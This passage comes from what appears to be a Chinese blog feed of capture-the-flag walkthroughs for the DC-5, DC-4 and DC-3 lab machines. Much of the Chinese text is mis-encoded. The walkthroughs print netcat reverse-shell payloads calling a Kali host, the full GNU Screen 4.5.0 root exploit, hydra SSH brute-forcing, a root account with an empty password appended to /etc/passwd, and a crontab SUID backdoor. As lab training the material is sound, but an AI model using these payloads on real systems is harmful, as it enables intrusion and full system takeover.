 1          56530/tcp   statusMAC Address: 00:0C:29:1A:8C:74 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopTRACEROUTEHOP RTT     ADDRESS1   0.27 ms 192.168.124.149Nmap scan report for 192.168.124.254</code></pre><p>å‘ç°å¼€äº†80,111ç«¯å£ï¼Œæ“ä½œç³»ç»Ÿæ˜¯linuxï¼Œnginx 1.6.2<br>å¯¹ç«¯å£è¿›ä¸€æ­¥æ¢æµ‹</p><pre><code>nmap -sS 192.168.124.149 -p 1-65535</code></pre><pre><code>Nmap scan report for 192.168.124.149Host is up (0.00089s latency).Not shown: 65532 closed portsPORT      STATE SERVICE80/tcp    open  http111/tcp   open  rpcbind56530/tcp open  unknownMAC Address: 00:0C:29:1A:8C:74 (VMware)Nmap done: 1 IP address (1 host up) scanned in 2.46 seconds</code></pre><p>å¼€äº†56530ç«¯å£<br>è¿›å…¥80ç«¯å£æŸ¥çœ‹<br><img src="/images/pasted-199.png" alt="upload successful"></p><h2 id="å‘ç°ä¸€ä¸ªç•™è¨€åŠŸèƒ½"><a href="#å‘ç°ä¸€ä¸ªç•™è¨€åŠŸèƒ½" class="headerlink" title="å‘ç°ä¸€ä¸ªç•™è¨€åŠŸèƒ½"></a>å‘ç°ä¸€ä¸ªç•™è¨€åŠŸèƒ½</h2><p>å°è¯•äº†xsså‘ç°å¹¶æ²¡æœ‰<br>æ‰«æä¸€ä¸‹ç›®å½•ï¼Œå‘ç°ç‰¹åˆ«çš„footer.php<br><img src="/images/pasted-200.png" alt="upload successful"><br>è®¿é—®å‘ç°æ—¥æœŸæ€»åœ¨å˜<br><img src="/images/pasted-201.png" alt="upload successful"><br>å‘ç°ç•™è¨€çš„åœ°æ–¹çš„æ—¥æœŸä¹Ÿæ€»åœ¨å˜<br><img src="/images/pasted-202.png" alt="upload successful"><br>ç„¶åthankyou.phpåº”è¯¥æ˜¯åŒ…å«äº†footer.phpé¡µé¢<br>å°è¯•æ–‡ä»¶åŒ…å«è¯»å–thankyou.phpæ–‡ä»¶å’Œå…¶ä»–æ–‡ä»¶ï¼Œå‘ç°èƒ½å¤ŸæˆåŠŸè¯»å–</p><p><img src="/images/pasted-204.png" alt="upload successful"><br><img src="/images/pasted-203.png" alt="upload successful"><br>å°è¯•å†™å…¥æ–‡ä»¶è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œèƒ½å†™å…¥çš„æ–‡ä»¶åƒä¸­é—´ä»¶æ—¥å¿—æ–‡ä»¶ï¼Œsshç™»å½•çš„æ—¥å¿—æ–‡ä»¶ï¼Œä¸´æ—¶æ–‡ä»¶ç­‰ç­‰<br>å‚è€ƒä¹‹å‰çš„æ–‡ä»¶åŒ…å«<a href="https://lnng.top/posts/6b68.html">https://lnng.top/posts/6b68.html</a><br>è¿™ä¸ªè¿˜æ˜¯å°è¯•åŒ…å«ä¸­é—´ä»¶çš„æ—¥å¿—æ–‡ä»¶å§ï¼Œå› ä¸ºsshçš„ç™»å½•ç«¯å£ä¸çŸ¥ï¼Œä¸”å…¶ä»–çš„æ–¹æ³•ä¸å¥½åˆ©ç”¨<br>éšä¾¿è®¿é—®ä¸€ä¸ªæœ¨é©¬<br><img src="/images/pasted-205.png" alt="upload successful"><br>èšå‰‘è¿æ¥å‘ç°è¿æ¥æˆåŠŸ<br><img src="/images/pasted-206.png" alt="upload successful"></p><h2 id="åå¼¹äº¤äº’shell"><a href="#åå¼¹äº¤äº’shell" class="headerlink" title="åå¼¹äº¤äº’shell"></a>åå¼¹äº¤äº’shell</h2><p>åœ¨/var/tmp/ä¸‹æ–°å»ºphpshellæ–‡ä»¶ï¼Œå†™å…¥</p><pre><code>&lt;?phpsystem(&quot;nc 192.168.124.139 4444 -e /bin/sh&quot;);?&gt;</code></pre><p>kaliç«¯</p><pre><code>nc -l -p 4444</code></pre><p>åå¼¹shell</p><pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p><img src="/images/pasted-207.png" alt="upload successful"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>å°è¯•suidææƒ</p><pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p><img src="/images/pasted-208.png" alt="upload successful"><br>GNU Screenæ˜¯ä¸€æ¬¾ç”±GNUè®¡åˆ’å¼€å‘çš„ç”¨äºå‘½ä»¤è¡Œç»ˆç«¯åˆ‡æ¢çš„è‡ªç”±è½¯ä»¶ã€‚ç”¨æˆ·å¯ä»¥é€šè¿‡è¯¥è½¯ä»¶åŒæ—¶è¿æ¥å¤šä¸ªæœ¬åœ°æˆ–è¿œç¨‹çš„å‘½ä»¤è¡Œä¼šè¯ï¼Œå¹¶åœ¨å…¶é—´è‡ªç”±åˆ‡æ¢ã€‚<br>GNU Screenå¯ä»¥çœ‹ä½œæ˜¯çª—å£ç®¡ç†å™¨çš„å‘½ä»¤è¡Œç•Œé¢ç‰ˆæœ¬ã€‚å®ƒæä¾›äº†ç»Ÿä¸€çš„ç®¡ç†å¤šä¸ªä¼šè¯çš„ç•Œé¢å’Œç›¸åº”çš„åŠŸèƒ½ã€‚<br>æœç´¢æ¼æ´</p><pre><code>searchsploit screen 4.5.0</code></pre><p>å‘ç°ä¸¤ä¸ªå¯åˆ©ç”¨çš„æ¼æ´<br><img src="/images/pasted-209.png" alt="upload successful"><br>ä½¿ç”¨ç¬¬ä¸€ä¸ª<br>å…ˆå°†41154.shå¤åˆ¶åˆ°æ¡Œé¢</p><pre><code>cp /usr/share/exploitdb/exploits/linux/local/41154.sh 41154.shcat 41154.sh</code></pre><pre><code>#!/bin/bash# screenroot.sh# setuid screen v4.5.0 local root exploit# abuses ld.so.preload overwriting to get root.# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html# HACK THE PLANET# ~ infodox (25/1/2017) echo &quot;~ gnu/screenroot ~&quot;echo &quot;[+] First, we create our shell and library...&quot;cat &lt;&lt; EOF &gt; /tmp/libhax.c#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;__attribute__ ((__constructor__))void dropshell(void){    chown(&quot;/tmp/rootshell&quot;, 0, 0);    chmod(&quot;/tmp/rootshell&quot;, 04755);    unlink(&quot;/etc/ld.so.preload&quot;);    printf(&quot;[+] done!\n&quot;);}EOFgcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.crm -f /tmp/libhax.ccat &lt;&lt; EOF &gt; /tmp/rootshell.c#include &lt;stdio.h&gt;int main(void){    setuid(0);    setgid(0);    seteuid(0);    setegid(0);    execvp(&quot;/bin/sh&quot;, NULL, NULL);}EOFgcc -o /tmp/rootshell /tmp/rootshell.crm -f /tmp/rootshell.cecho &quot;[+] Now we create our /etc/ld.so.preload file...&quot;cd /etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline neededecho &quot;[+] Triggering...&quot;screen -ls # screen itself is setuid, so... </code></pre><p>è¿™é‡Œå‘Šè¯‰äº†æˆ‘ä»¬ä½¿ç”¨æ–¹æ³•<br>å…ˆå°†ç¬¬ä¸€éƒ¨åˆ†å†™å…¥libhax.cæ–‡ä»¶ä¸­</p><pre><code>#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;__attribute__ ((__constructor__))void dropshell(void){    chown(&quot;/tmp/rootshell&quot;, 0, 0);    chmod(&quot;/tmp/rootshell&quot;, 04755);    unlink(&quot;/etc/ld.so.preload&quot;);    printf(&quot;[+] done!\n&quot;);}</code></pre><p>ç„¶åç¼–è¯‘</p><pre><code>gcc -fPIC -shared -ldl -o libhax.so libhax.c</code></pre><p><img src="/images/pasted-210.png" alt="upload successful"><br>å°†ä¸­é—´çš„ä»£ç å­˜å…¥rootshell.cä¸­</p><pre><code>#include &lt;stdio.h&gt;int main(void){    setuid(0);    setgid(0);    seteuid(0);    setegid(0);    execvp(&quot;/bin/sh&quot;, NULL, NULL);}</code></pre><p>ç„¶åç¼–è¯‘</p><pre><code>gcc -o rootshell rootshell.c</code></pre><p><img src="/images/pasted-211.png" alt="upload successful"><br>å°†å‰©ä½™ä»£ç ä¿å­˜åˆ°dc5.sh</p><pre><code>echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;cd /etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline neededecho &quot;[+] Triggering...&quot;screen -ls # screen itself is setuid, so.../tmp/rootshell</code></pre><p>å¹¶è¾“å…¥:</p><pre><code>set ff=unix</code></pre><p><img src="/images/pasted-212.png" alt="upload successful"><br>å°†ä¸‰ä¸ªæ–‡ä»¶ä¸Šä¼ åˆ°/tmpæ–‡ä»¶ä¸­<br>ç„¶åä¿®æ”¹dc5.shçš„æƒé™</p><pre><code>chmod 777 dc5.sh</code></pre><p>ç„¶åæ‰§è¡Œ</p><pre><code>./dc5.sh</code></pre><p><img src="/images/pasted-213.png" alt="upload successful"><br>è¯»å–flag<br><img src="/images/pasted-214.png" alt="upload successful"></p><pre><code>cat thisistheflag.txt                                                                                                             888b    888 d8b                                                      888      888 888 888                                         8888b   888 Y8P                                                      888      888 888 888                                         88888b  888                                                          888      888 888 888                                         888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888                                         888 Y88b888 888 d88P&quot;   d8P  Y8b      888  888  888 d88&quot;&quot;88b 888P&quot;   888 .88P 888 888 888                                         888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P                                         888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 &quot;88b  &quot;   &quot;   &quot;                                          888    Y888 888  &quot;Y8888P &quot;Y8888        &quot;Y8888888P&quot;   &quot;Y88P&quot;  888     888  888 888 888 888                                         Once again, a big thanks to all those who do these little challenges,and especially all those who give me feedback - again, it&#39;s all greatlyappreciated.  :-)I also want to send a big thanks to all those who find the vulnerabilitiesand create the exploits that make these challenges possible.</code></pre><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://www.jianshu.com/p/8f6e1e4d44b9" target="_blank" rel="noopener">https://www.jianshu.com/p/8f6e1e4d44b9</a><br><a href="https://www.anquanke.com/post/id/178958" target="_blank" rel="noopener">https://www.anquanke.com/post/id/178958</a></p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶åœº </tag>
            
            <tag> DC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC4-é¶æœº</title>
      <link href="/posts/fe4d.html"/>
      <url>/posts/fe4d.html</url>
      
        <content type="html"><![CDATA[<h2 id="é¶åœºçš„æ­å»º"><a href="#é¶åœºçš„æ­å»º" class="headerlink" title="é¶åœºçš„æ­å»º"></a>é¶åœºçš„æ­å»º</h2><p>é¶åœºä¸‹è½½åœ°å€:<a href="https://download.vulnhub.com/dc/DC-4.zip" target="_blank" rel="noopener">https://download.vulnhub.com/dc/DC-4.zip</a></p><h2 id="åŸºæœ¬ä¿¡æ¯æ”¶é›†"><a href="#åŸºæœ¬ä¿¡æ¯æ”¶é›†" class="headerlink" title="åŸºæœ¬ä¿¡æ¯æ”¶é›†"></a>åŸºæœ¬ä¿¡æ¯æ”¶é›†</h2><p>nmapæ‰«æç½‘æ®µ</p><pre><code>nmap -sS -A 192.168.124.0/24</code></pre><pre><code>Nmap scan report for 192.168.124.148Host is up (0.00022s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)| ssh-hostkey: |   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)80/tcp open  http    nginx 1.15.10|_http-server-header: nginx/1.15.10|_http-title: System ToolsMAC Address: 00:0C:29:40:C9:C1 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT     ADDRESS1   0.22 ms 192.168.124.148</code></pre><p>å¾—åˆ°åŸºæœ¬ä¿¡æ¯å¼€æ”¾äº†80ï¼Œsshç«¯å£ï¼Œæ“ä½œç³»ç»ŸDebian<br>å…ˆçˆ†ç ´ä¸€ä¸‹sshå§(æ— ç»“æœ)</p><pre><code>nmap --script=ssh-brute 192.168.124.148</code></pre><p>æŸ¥çœ‹80ç«¯å£ï¼Œå‘ç°ä¸æ˜¯cmsï¼Œæ˜¯ä¸ªç™»å½•æ¡†ï¼Œæé†’adminç™»å½•<br><img src="/images/pasted-180.png" alt="upload successful"><br>å°è¯•sql,burpsuiteè·‘ä¸€ä¸‹å­—å…¸æ²¡ç»“æœï¼Œé‚£æˆ‘å†è·‘ä¸€ä¸‹çœ‹çœ‹æœ‰è¿‡æ»¤æ²¡(æˆ‘ä¸¢è¿˜æ˜¯å•¥ç»“æœæ²¡æœ‰)ï¼Œçœ‹æ¥æ²¡æœ‰æ³¨å…¥å‘€<br><img src="/images/pasted-181.png" alt="upload successful"><br><img src="/images/pasted-182.png" alt="upload successful"><br>è®©æˆ‘ç™¾åº¦ä¸€ä¸‹é¢˜è§£ï¼Œæˆ‘ä¸¢ï¼Œæš´åŠ›ç ´è§£å¯†ç å¯è¿˜è¡Œï¼Œé‚£æ˜¯æ—¶å€™ç¥­å‡ºæˆ‘100wçš„å¤§å­—å…¸äº†(heng!)<br>å†è§æ²¡çˆ†ç ´å‡ºæ¥ç›´æ¥çœ‹ç­”æ¡ˆ(æˆ‘ä¸€ç‚¹ä¹Ÿä¸happy)ï¼Œçœ‹æ¥å­—å…¸æœ‰çš„è½åäº†</p><pre><code>è´¦å·:adminå¯†ç :happy</code></pre><h2 id="ç™»å½•è¿›å»"><a href="#ç™»å½•è¿›å»" class="headerlink" title="ç™»å½•è¿›å»"></a>ç™»å½•è¿›å»</h2><p>å°è¯•ç™»å½•å‘ç°æ˜¯ä¸ªå‘½ä»¤æ‰§è¡ŒåŠŸèƒ½ï¼ŒæŠ“åŒ…çœ‹çœ‹ï¼Œæ›´æ”¹ä¸€ä¸‹lsï¼Œå‘ç°èƒ½è¯»å–æ–‡ä»¶ï¼Œé‚£å…ˆè¯»å–commentçœ‹çœ‹æ˜¯æ€ä¹ˆæ‰§è¡Œçš„<br><img src="/images/pasted-183.png" alt="upload successful"></p><p><img src="/images/pasted-184.png" alt="upload successful"><br>æˆ‘ä¸¢ï¼Œç›´æ¥shell_exec(),é‚£ç›´æ¥åå¼¹shell</p><pre><code>nc 192.168.124.139 4444 -e /bin/bashkaliç«¯netcat -l -p 4444</code></pre><p><img src="/images/pasted-185.png" alt="upload successful"><br>åå¼¹ä¸€ä¸‹äº¤äº’shell</p><pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/sh&quot;)&#39;</code></pre><p><img src="/images/pasted-187.png" alt="upload successful"></p><h2 id="å‘ç°å¯†ç "><a href="#å‘ç°å¯†ç " class="headerlink" title="å‘ç°å¯†ç "></a>å‘ç°å¯†ç </h2><p>åœ¨ä¸‹é¢ç›®å½•å‘ç°old-passwords.bak</p><p>/home/jim/backups<br>è¯´æ˜¯oldå¯†ç ,æ‰“å¼€</p><pre><code>cat old-passwords.bak00000012345iloveyou1q2w3e4r5t1234123456aqwertyuiopmonkey123321dragon654321666666123myspace1a1234561212121qaz2wsx123qwe123abctinkletarget123gwerty1g2w3e4rgwerty123zag12wsx7777777qwerty11q2w3e4r987654321222222qwe123qwerty123zxcvbnm555555112233fuckyouasdfghjkl12345a1231231231q2w3eqazwsxloveme1juventusjennifer1!~!1bubblessamuelfuckoffloverscheese10123456123asd999999999madisonelizabeth1musicbuster1laurendavid1tigger1123qweasdtaylor1carlostinkerbellsamantha1Sojdlg123aljgjoshua1poopstellamyspace123asdasd5freedom1whatever1xxxxxx00000valentinaa1b2c3741852963austinmonicaqaz123lovely1music1harley1family1spongebob1stevennirvana1234abcdhellokittythomas1cooper520520muffinchristian1love13fucku2arsenal1lucky7diabloapplesgeorge1babyboy1crystal1122334455player1aa123456vfhbyfforever1Passwordwinstonchivas1sexyhockey11a2b3c4dpussyplayboy1stalkercherrytweetytoyotacreativegeminipretty1maverickbrittany1nathan1letmein1cameron1secret1google1heavenmartinamurphyspongebobuQA9Ebw445fernandoprettystartfindingsoftballdolphin1fuckmetest123qwerty1234kobe24alejandroadrianseptemberaaaaaa1bubba1isabellaabc123456password3jason1abcdefg123loveyou1shannon100200manuelleonardomolly1flowers123456z007007password.321321miguelsamsung1sergeysweet1abc1234windowsqwert123vfrcbvpoohbeard123456school1badboy951753123456c111steven1snoopy1garfieldYAgjecc826compaqcandy1sarah1qwerty123456123456leminem1141414789789mariasteelersiloveme1morgan1winnerboomerlolitanastyaalexis1carmenangelonicholas1portugalpreciousjackass1jonathan1yfnfifbitchtiffanyrabbitrainbow1angel123popcornbarbarabrandystarwars1barneynataliajibril04hiphoptiffany1shortypoohbear1simonealbertmarlborohardcorecowboyssydneyalexscorpio1234512345q12345qq123456onelovebond007abcdefg1eaglescrystal1azertyuiopwintersexy12angelinajamessvetlanafatima123456kicecreampopcorn1</code></pre><p>ç”Ÿæˆçˆ†ç ´å­—å…¸ï¼Œçˆ†ç ´ssh<br>ä½¿ç”¨hydraï¼Œè¿›è¡Œçˆ†ç ´,hydraæ˜¯è‘—åé»‘å®¢ç»„ç»‡thcçš„ä¸€æ¬¾å¼€æºçš„æš´åŠ›å¯†ç ç ´è§£å·¥å…·ï¼Œå¯ä»¥åœ¨çº¿ç ´è§£å¤šç§å¯†ç ã€‚ </p><pre><code>ç ´è§£sshï¼š hydra -l ç”¨æˆ·å -p å¯†ç å­—å…¸ -t çº¿ç¨‹ -vV -e ns ip ssh hydra -l ç”¨æˆ·å -p å¯†ç å­—å…¸ -t çº¿ç¨‹ -o save.log -vV ip ssh ç ´è§£ftpï¼š hydra ip ftp -l ç”¨æˆ·å -P å¯†ç å­—å…¸ -t çº¿ç¨‹(é»˜è®¤16) -vV hydra ip ftp -l ç”¨æˆ·å -P å¯†ç å­—å…¸ -e ns -vV </code></pre><pre><code>çˆ†ç ´sshhydra -l jim -P passwd.txt -t 10 ssh://192.168.124.148</code></pre><h2 id="çˆ†å‡ºsshç™»å½•å¯†ç "><a href="#çˆ†å‡ºsshç™»å½•å¯†ç " class="headerlink" title="çˆ†å‡ºsshç™»å½•å¯†ç "></a>çˆ†å‡ºsshç™»å½•å¯†ç </h2><pre><code>Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-10 08:38:19[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[DATA] max 10 tasks per 1 server, overall 10 tasks, 252 login tries (l:1/p:252), ~26 tries per task[DATA] attacking ssh://192.168.124.148:22/[STATUS] 110.00 tries/min, 110 tries in 00:01h, 142 to do in 00:02h, 10 active[STATUS] 80.00 tries/min, 160 tries in 00:02h, 92 to do in 00:02h, 10 active                                                      [22][ssh] host: 192.168.124.148   login: jim   password: jibril04                                                                 1 of 1 target successfully completed, 1 valid password found                                                                      Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-10 08:41:16</code></pre><p>sshè´¦å·:jimå¯†ç :jibril04</p><p><img src="/images/pasted-189.png" alt="upload successful"></p><h2 id="æç¤ºæœ‰ä¸ªmail"><a href="#æç¤ºæœ‰ä¸ªmail" class="headerlink" title="æç¤ºæœ‰ä¸ªmail"></a>æç¤ºæœ‰ä¸ªmail</h2><p>è¯»å–ä¸€ä¸‹ä¿¡å°</p><pre><code>/var/mail/jim</code></pre><p>å‘Šè¯‰äº†æˆ‘ä»¬è´¦å·å¯†ç <br><img src="/images/pasted-190.png" alt="upload successful"></p><pre><code>Password is:  ^xHhA&amp;hvim0ySee ya,Charles</code></pre><p>åˆ‡æ¢ä¸€ä¸‹ç”¨æˆ·</p><pre><code>su charles</code></pre><p>æŸ¥çœ‹èƒ½å¤Ÿrootæ‰§è¡Œçš„å‘½ä»¤</p><pre><code>sudo -l</code></pre><p><img src="/images/pasted-191.png" alt="upload successful"><br>å‘æœ‰èƒ½å¤Ÿä»¥rootæ‰§è¡Œçš„teeheeå‘½ä»¤,è€Œteeheeçš„ä½œç”¨æ˜¯å¯ä»¥å‘æ–‡ä»¶ä¸­è¿½åŠ å†…å®¹</p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><h3 id="å°†è´¦å·å†™å…¥-etc-passwdä¸­"><a href="#å°†è´¦å·å†™å…¥-etc-passwdä¸­" class="headerlink" title="å°†è´¦å·å†™å…¥/etc/passwdä¸­"></a>å°†è´¦å·å†™å…¥/etc/passwdä¸­</h3><p>å¯†ç è®¾ç½®ä¸ºç©º</p><pre><code>echo &quot;admin::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</code></pre><p>å¯¹äºadmin::0:0:::/bin/bashçš„è§£é‡Š</p><pre><code>[ç”¨æˆ·å]ï¼š[å¯†ç ]ï¼š[UID]ï¼š[GID]ï¼š[èº«ä»½æè¿°]ï¼š[ä¸»ç›®å½•]ï¼š[ç™»å½•shell]</code></pre><p><a href="https://www.cnblogs.com/backlion/p/10503978.html" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« </a><br><img src="/images/pasted-192.png" alt="upload successful"><br>ä¹Ÿå¯ä»¥ä¸å°†å¯†ç è®¾ç½®ä¸ºç©º</p><pre><code>mkpasswd -m SHA-512 12345</code></pre><p><img src="/images/pasted-195.png" alt="upload successful"><br>ç„¶å</p><pre><code>sudo teehee -a /etc/passwd 12345:$6$OXVv4N3qtVc0LQeI$CPmgAD9tTpzpCu86IaC9gIx6MYta8/huc3utEd3WwyhUWSbDxKIwi/3XCAHjOqn.rT/lamYZTxbKDoJXkxXaa1:0:0:::/bin/bash</code></pre><p>å…¶ä¸­-e ç±»ä¼¼ç­‰äº&gt;&gt;<br>ç„¶ååˆ‡æ¢ç”¨æˆ·<br><img src="/images/pasted-196.png" alt="upload successful"><br><img src="/images/pasted-197.png" alt="upload successful"></p><pre><code>cat /root/flag.txt</code></pre><pre><code>888       888          888 888      8888888b.                             888 888 888 888 888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 888  d8b  888          888 888      888    888                            888 888 888 888 888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 Congratulations!!!Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all thosewho have provided feedback, and who have taken time to complete these littlechallenges.If you enjoyed this CTF, send me a tweet via @DCAU7.</code></pre><h3 id="å†™å…¥å®šæ—¶æ–‡ä»¶-etc-crontab"><a href="#å†™å…¥å®šæ—¶æ–‡ä»¶-etc-crontab" class="headerlink" title="å†™å…¥å®šæ—¶æ–‡ä»¶/etc/crontab"></a>å†™å…¥å®šæ—¶æ–‡ä»¶/etc/crontab</h3><p>å‘/etc/crontabæ–‡ä»¶ä¸­å†™å…¥æ–°çš„å®šæ—¶ä»»åŠ¡</p><p>æ—¶é—´éƒ¨åˆ†å…¨éƒ¨å¡«å†™ä¸º*ï¼Œæ„æ€æ˜¯æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ï¼Œé€šè¿‡å†™å…¥å°†/bin/shçš„æƒé™ä¿®æ”¹ä¸º4777ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨érootç”¨æˆ·ä¸‹æ‰§è¡Œå®ƒï¼Œå¹¶ä¸”æ‰§è¡ŒæœŸé—´æ‹¥æœ‰rootæƒé™ã€‚</p><pre><code>sudo teehee /etc/crontab* * * * * root chmod 4777 /bin/sh</code></pre><p><img src="/images/pasted-198.png" alt="upload successful"></p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://www.anquanke.com/post/id/178658#h3-5" target="_blank" rel="noopener">å®‰å…¨å®¢</a></p><p><a href="https://www.cnblogs.com/yurang/p/13721862.html" target="_blank" rel="noopener">https://www.cnblogs.com/yurang/p/13721862.html</a></p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶åœº </tag>
            
            <tag> DC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC3-é¶æœº</title>
      <link href="/posts/180c.html"/>
      <url>/posts/180c.html</url>
      
        <content type="html"><![CDATA[<h2 id="é¶åœºæ­å»º"><a href="#é¶åœºæ­å»º" class="headerlink" title="é¶åœºæ­å»º"></a>é¶åœºæ­å»º</h2><p>é¶åœºçš„ä¸‹è½½ï¼š<a href="http://www.five86.com/downloads/DC-3-2.zip" target="_blank" rel="noopener">http://www.five86.com/downloads/DC-3-2.zip</a></p><h2 id="åŸºæœ¬ä¿¡æ¯æ”¶é›†"><a href="#åŸºæœ¬ä¿¡æ¯æ”¶é›†" class="headerlink" title="åŸºæœ¬ä¿¡æ¯æ”¶é›†"></a>åŸºæœ¬ä¿¡æ¯æ”¶é›†</h2><pre><code>nmap -sS A 192.168.124.0/24</code></pre><pre><code>Nmap scan report for 192.168.124.147Host is up (0.00041s latency).Not shown: 999 closed portsPORT   STATE SERVICE VERSION80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))|_http-generator: Joomla! - Open Source Content Management|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: HomeMAC Address: 00:0C:29:EF:73:10 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopTRACEROUTEHOP RTT     ADDRESS1   0.41 ms 192.168.124.147</code></pre><p>å¯¹ç«¯å£çš„è¿›ä¸€æ­¥æ‰«æï¼Œæ²¡æœ‰å‘ç°å…¶ä»–çš„ç«¯å£</p><pre><code>nmap 192.168.124.147</code></pre><p>è®¿é—®192.168.124.147çš„80ç«¯å£ï¼Œå‘ç°æç¤ºï¼Œå’Œcmsæ˜¯joomla<br><img src="/images/pasted-147.png" alt="upload successful"><br>ä½¿ç”¨joomscanè¿›è¡Œè¿›ä¸€æ­¥æ‰«æ</p><p>å®ƒæ˜¯ä¸€ä¸ªJoomlaæ‰«æä»ªã€‚ å®ƒå°†å¸®åŠ©ç½‘ç»œå¼€å‘äººå‘˜å’Œç½‘ç«™ç®¡ç†å‘˜å¸®åŠ©ç¡®å®šå·²éƒ¨ç½²çš„Joomlaç½‘ç«™å¯èƒ½å­˜åœ¨çš„å®‰å…¨æ¼æ´ã€‚</p><pre><code>å®‰è£…joomscan(kaliä¸­)apt-get install joomscanjoomscan --url http://192.168.124.147</code></pre><p><img src="/images/pasted-148.png" alt="upload successful"><br>ä¹Ÿå¯ä½¿ç”¨CMSseekè¿›ä¸€æ­¥æ‰«æ</p><pre><code>å®‰è£…CMSseekgit clone https://github.com/Tuhinshubhra/CMSeeKä½¿ç”¨python3 cmseek.py --url 192.168.124.147</code></pre><p>ä¿¡æ¯ä¸€æ ·<br><img src="/images/pasted-149.png" alt="upload successful"></p><h2 id="æœç´¢joomlaæ¼æ´"><a href="#æœç´¢joomlaæ¼æ´" class="headerlink" title="æœç´¢joomlaæ¼æ´"></a>æœç´¢joomlaæ¼æ´</h2><pre><code>searchsploit joomla 3.7.0</code></pre><p><img src="/images/pasted-150.png" alt="upload successful"><br>æ‰“å¼€æŸ¥çœ‹æ¼æ´è¯¦æƒ…</p><pre><code>cat /usr/share/exploitdb/exploits/php/webapps/42033.txt </code></pre><p>æŸ¥çœ‹å‘ç°å­˜åœ¨sqlæ³¨å…¥ï¼Œå…·ä½“æ¼åŸç†<a href="https://paper.seebug.org/305/" target="_blank" rel="noopener">seebug</a><br>ç®€å•æ¥è¯´å°±æ˜¯<br>com_fieldsç»„ä»¶ï¼Œå¯¹è¯·æ±‚æ•°æ®æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œä»è€Œå¯¼è‡´sqlæ³¨å…¥ï¼Œæœªè¿‡æ»¤ä½ç½®<br><img src="/images/pasted-152.png" alt="upload successful"><br><img src="/images/pasted-151.png" alt="upload 